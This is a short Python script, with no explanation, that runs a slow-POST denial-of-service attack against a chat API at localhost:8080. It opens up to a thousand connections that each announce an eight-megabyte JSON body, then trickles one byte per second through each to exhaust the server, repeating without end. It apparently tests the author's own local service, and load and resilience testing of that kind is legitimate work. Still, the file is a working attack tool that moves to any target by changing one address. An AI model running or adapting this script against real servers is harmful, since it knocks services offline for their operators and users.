import socket
import threading
import time


def slowsend():
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect(("localhost", 8080))
    tcp.send(b"POST /api/chats HTTP/1.1\r\n")
    tcp.send(b"Content-Length: 8000000\r\n")
    tcp.send(b"Content-Type: application/json\r\n")
    tcp.send(b"\r\n")
    for i in range(100000):
        tcp.send(b"L")
        time.sleep(1)
    response = tcp.recv(1000000)

def slowersend():
    sockets = []
    for i in range(1000):
        sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        sockets[i].connect(("localhost", 8080))
        sockets[i].send(b"POST /api/chats HTTP/1.1\r\n")
        sockets[i].send(b"Content-Length: 8000000\r\n")
        sockets[i].send(b"Content-Type: application/json\r\n")
        sockets[i].send(b"\r\n")
        print(f"bot {i} created")
    for j in range(100000):
        numterm = 0
        for i in range(1000):
            try:
                sockets[i].send(b"L")
                print(f"bot {i} sent")
            except Exception as e:
                numterm += 1
                print(f"bot {i} terminated")
        print(f"Number of bots crashed {numterm}")
        if numterm > 500:
            print("Num of bots term to high")
            return
        time.sleep(1)

if __name__ == '__main__':
    while True:
        slowersend()
    #for i in range(300):
     #   threading.Thread(target=slowsend).start()
      #  time.sleep(0.5)